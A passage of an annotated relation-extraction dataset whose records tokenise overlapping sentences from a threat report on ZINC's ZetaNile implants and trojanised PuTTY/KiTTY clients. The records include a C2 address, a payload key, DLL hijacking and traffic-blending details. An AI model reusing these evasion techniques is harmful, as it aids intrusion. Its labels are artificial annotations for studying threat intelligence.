"evidence": [4], "h": 14, "t": 15}, {"r": "RF", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 17}, {"r": "FR", "evidence": [4, 5], "h": 17, "t": 21}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 18}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 19}, {"r": "CO", "evidence": [4], "h": 14, "t": 16}, {"r": "EX", "evidence": [5], "h": 21, "t": 23}, {"r": "CO", "evidence": [5, 6, 7], "h": 22, "t": 29}, {"r": "RD", "evidence": [5, 6], "t": 23, "h": 24}, {"r": "WR", "evidence": [6], "h": 24, "t": 25}, {"r": "WR", "evidence": [6], "h": 24, "t": 25}, {"r": "WR", "evidence": [6], "h": 24, "t": 26}, {"r": "WR", "evidence": [6, 7], "t": 25, "h": 28}, {"r": "WR", "evidence": [6, 7], "t": 26, "h": 28}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}]}, {"title": "052-1", "sents": [["The", "payload", "in", "the", "malicious", "DLL", "is", "decrypted", "using", "a", "custom", "key", ",", "passed", "as", "part", "of", "the", "DLL", "search", "order", "hijacking", "of", "the", "legitimate", "Windows", "process", ",", "as", "shown", "in", "Figure", "3", "."], ["The", "ZetaNile", "implants", "use", "unique", "custom", "encryption", "methods", "or", "AES", "encryption", "to", "generate", "command", "and", "control", "(", "C2", ")", "HTTP", "requests", "to", "known", "compromised", "C2", "domains", "."], ["By", "encoding", "the", "victim", "information", "in", "the", "parameters", "for", "common", "keywords", "like", "gametype", "or", "bbs", "in", "the", "HTTP", "POSTs", ",", "these", "C2", "communications", "can", "blend", "in", "with", "legitimate", "traffic", "."], ["Once", "they", "have", "established", "a", "connection", "with", "their", "target", ",", "ZINC", "operationalized", "malicious", "versions", "of", "two", "SSH", "clients", ",", "PuTTY", "and", "KiTTY", ",", "that", "acted", "as", "the", "entry", "vector", "for", "the", "ZetaNile", "implant", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "payload", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "DLL", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "custom key", "pos": [10, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "DLL", "pos": [18, 19], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [25, 25], "name": "Windows process", "pos": [25, 27], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "ZetaNile implants", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "custom encryption", "pos": [5, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "AES encryption", "pos": [9, 11], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "C2 domains", "pos": [24, 26], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "victim information", "pos": [3, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "they", "pos": [1, 2], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [99, 99], "name": "target", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "ZINC", "pos": [10, 11], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "SSH clients", "pos": [16, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "PuTTY", "pos": [19, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [112, 112], "name": "KiTTY", "pos": [21, 22], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "ZetaNile implant", "pos": [31, 33], "index": "16_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [130, 130], "name": "recipient", "pos": [5, 6], "index": "17_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [134, 134], "name": "ReadMe.txt", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "executable file", "pos": [12, 14], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [148, 148], "name": "ZINC", "pos": [6, 7], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [166, 166], "name": "executable", "pos": [24, 25], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "ZetaNile implant", "pos": [29, 31], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [175, 175], "name": "ZetaNile", "pos": [1, 2], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [181, 181], "name": "SSH utility", "pos": [7, 9], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [189, 189], "name": "ReadMe.txt file", "pos": [15, 17], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [192, 192], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "IJ", "evidence": [1], "t": 5, "h": 6}, {"r": "IJ", "evidence": [1], "t": 5, "h": 7}, {"r": "ST", "evidence": [1], "h": 5, "t": 8}, {"r": "RF", "evidence": [1], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 16}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 5, "t": 23}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 10}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 13}, {"r": "FR", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 14}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 15}, {"r": "CO", "evidence": [3], "h": 10, "t": 12}, {"r": "EX", "evidence": [4], "h": 17, "t": 19}, {"r": "CO", "evidence": [4, 5, 6], "h": 18, "t": 25}, {"r": "RD", "evidence": [4, 5], "t": 19, "h": 20}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "WR", "evidence": [5, 6], "t": 21, "h": 24}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 24}, {"r": "RD", "evidence": [6], "h": 24, "t": 25}, {"r": "ST", "evidence": [6, 7], "h": 24, "t": 26}, {"r": "RF", "evidence": [6, 7], "h": 24, "t": 26}]}, {"title": "052-2", "sents": [["The", "ZetaNile", "implants", "use", "unique", "custom", "encryption", "methods", "or", "AES", "encryption", "to", "generate", "command", "and", "control", "(", "C2", ")", "HTTP", "requests", "to", "known", "compromised", "C2", "domains", "."], ["By", "encoding", "the", "victim", "information", "in", "the", "parameters", "for", "common", "keywords", "like", "gametype", "or", "bbs", "in", "the", "HTTP", "POSTs", ",", "these", "C2", "communications", "can", "blend", "in", "with", "legitimate", "traffic", "."], ["Once", "they", "have", "established", "a", "connection", "with", "their", "target", ",", "ZINC", "operationalized", "malicious", "versions", "of", "two", "SSH", "clients", ",", "PuTTY", "and", "KiTTY", ",", "that", "acted", "as", "the", "entry", "vector", "for", "the", "ZetaNile", "implant", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "ZetaNile implants", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "custom encryption", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "AES encryption", "pos": [9, 11], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "C2 domains", "pos": [24, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "victim information", "pos": [3, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "they", "pos": [1, 2], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "target", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "ZINC", "pos": [10, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "SSH clients", "pos": [16, 18], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "PuTTY", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [78, 78], "name": "KiTTY", "pos": [21, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [88, 88], "name": "ZetaNile implant", "pos": [31, 33], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [96, 96], "name": "recipient", "pos": [5, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [100, 100], "name": "ReadMe.txt", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "executable file", "pos": [12, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "ZINC", "pos": [6, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "executable", "pos": [24, 25], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "ZetaNile implant", "pos": [29, 31], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "ZetaNile", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "SSH utility", "pos": [7, 9], "index": "19_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [155, 155], "name": "ReadMe.txt file", "pos": [15, 17], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [158, 158], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [163, 163], "name": "PUTTY.exe", "pos": [2, 3], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "Event Horizon malware", "pos": [8, 11], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [173, 173], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "24_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [179, 179], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [183, 183], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "26_0"}]], "labels": [{"r": "IJ", "evidence": [0], "t": 0, "h": 1}, {"r": "IJ", "evidence": [0], "t": 0, "h": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 11}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 18}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "ST", "evidence": [2], "h": 5, "t": 6}, {"r": "RF", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 8}, {"r": "FR", "evidence": [2, 3], "h": 8, "t": 12}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 9}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 10}, {"r": "CO", "evidence": [2], "h": 5, "t": 7}, {"r": "EX", "evidence": [3], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "h": 13, "t": 20}, {"r": "RD", "evidence": [3, 4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 15, "t": 17}, {"r": "WR", "evidence": [4, 5], "t": 16, "h": 19}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 19}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "ST", "evidence": [5, 6], "h": 19, "t": 21}, {"r": "RF", "evidence": [5, 6], "h": 19, "t": 21}, {"r": "ST", "evidence": [6, 7], "t": 21, "h": 22}, {"r": "RF", "evidence": [6, 7], "t": 21, "h": 22}, {"r": "RD", "evidence": [7], "h": 22, "t": 24}, {"r": "FR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 24}, {"r": "RD", "evidence": [7], "h": 22, "t": 26}, {"r": "RD", "evidence": [7], "h": 22, "t": 25}, {"r": "WR", "evidence": [7], "h": 22, "t": 26}]}, {"title": "052-3", "sents": [["By", "encoding", "the", "victim", "information", "in", "the", "parameters", "for", "common", "keywords", "like", "gametype", "or", "bbs", "in", "the", "HTTP", "POSTs", ",", "these", "C2", "communications", "can", "blend", "in", "with", "legitimate", "traffic", "."], ["Once", "they", "have", "established", "a", "connection", "with", "their", "target", ",", "ZINC", "operationalized", "malicious", "versions", "of", "two", "SSH", "clients", ",", "PuTTY", "and", "KiTTY", ",", "that", "acted", "as", "the", "entry", "vector", "for", "the", "ZetaNile", "implant", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "victim information", "pos": [3, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "they", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [38, 38], "name": "target", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "ZINC", "pos": [10, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "SSH clients", "pos": [16, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "PuTTY", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "KiTTY", "pos": [21, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [61, 61], "name": "ZetaNile implant", "pos": [31, 33], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [69, 69], "name": "recipient", "pos": [5, 6], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [73, 73], "name": "ReadMe.txt", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "executable file", "pos": [12, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "ZINC", "pos": [6, 7], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "executable", "pos": [24, 25], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [110, 110], "name": "ZetaNile implant", "pos": [29, 31], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "ZetaNile", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "SSH utility", "pos": [7, 9], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [128, 128], "name": "ReadMe.txt file", "pos": [15, 17], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [131, 131], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [136, 136], "name": "PUTTY.exe", "pos": [2, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "Event Horizon malware", "pos": [8, 11], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [146, 146], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [152, 152], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "21_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [156, 156], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [167, 167], "name": "ZINC", "pos": [7, 8], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "colurui.dll", "pos": [15, 16], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [180, 180], "name": "payload", "pos": [20, 21], "index": "25_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [185, 185], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "ST", "evidence": [1], "h": 1, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 4}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 5}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 6}, {"r": "CO", "evidence": [1], "h": 1, "t": 3}, {"r": "EX", "evidence": [2], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 16}, {"r": "RD", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 15}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 15}, {"r": "RD", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4, 5], "h": 15, "t": 17}, {"r": "RF", "evidence": [4, 5], "h": 15, "t": 17}, {"r": "ST", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RF", "evidence": [5, 6], "t": 17, "h": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 20}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [6], "h": 18, "t": 22}, {"r": "RD", "evidence": [6], "h": 18, "t": 21}, {"r": "WR", "evidence": [6], "h": 18, "t": 22}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}, {"r": "RD", "evidence": [7], "h": 23, "t": 25}, {"r": "RD", "evidence": [7], "h": 23, "t": 26}]}, {"title": "052-4", "sents": [["Once", "they", "have", "established", "a", "connection", "with", "their", "target", ",", "ZINC", "operationalized", "malicious", "versions", "of", "two", "SSH", "clients", ",", "PuTTY", "and", "KiTTY", ",", "that", "acted", "as", "the", "entry", "vector", "for", "the", "ZetaNile", "implant", "."], ["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "they", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "target", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "ZINC", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "SSH clients", "pos": [16, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "PuTTY", "pos": [19, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "KiTTY", "pos": [21, 22], "index": "5_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "ZetaNile implant", "pos": [31, 33], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "recipient", "pos": [5, 6], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [43, 43], "name": "ReadMe.txt", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "executable file", "pos": [12, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "ZINC", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "executable", "pos": [24, 25], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "ZetaNile implant", "pos": [29, 31], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "ZetaNile", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "SSH utility", "pos": [7, 9], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [98, 98], "name": "ReadMe.txt file", "pos": [15, 17], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [101, 101], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "PUTTY.exe", "pos": [2, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "Event Horizon malware", "pos": [8, 11], "index": "18_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [116, 116], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "19_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [122, 122], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "20_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [126, 126], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "ZINC", "pos": [7, 8], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [145, 145], "name": "colurui.dll", "pos": [15, 16], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [150, 150], "name": "payload", "pos": [20, 21], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [155, 155], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [170, 170], "name": "C2 server", "pos": [5, 7], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "attackers", "pos": [9, 10], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "malware", "pos": [13, 14], "index": "28_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 3, "t": 7}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [1], "h": 7, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 8, "t": 15}, {"r": "RD", "evidence": [1, 2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 14}, {"r": "WR", "evidence": [2, 3], "t": 12, "h": 14}, {"r": "RD", "evidence": [3], "h": 14, "t": 15}, {"r": "ST", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "RF", "evidence": [3, 4], "h": 14, "t": 16}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RD", "evidence": [5], "h": 17, "t": 19}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "RD", "evidence": [5], "h": 17, "t": 21}, {"r": "RD", "evidence": [5], "h": 17, "t": 20}, {"r": "WR", "evidence": [5], "h": 17, "t": 21}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 24}, {"r": "RD", "evidence": [6], "h": 22, "t": 25}, {"r": "ST", "evidence": [7], "t": 26, "h": 27}, {"r": "RF", "evidence": [7], "t": 26, "h": 27}, {"r": "FR", "evidence": [7], "h": 27, "t": 28}]}, {"title": "052-5", "sents": [["Within", "that", "archive", ",", "the", "recipient", "is", "provided", "a", "ReadMe.txt", "and", "an", "executable", "file", "to", "run", "."], ["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", 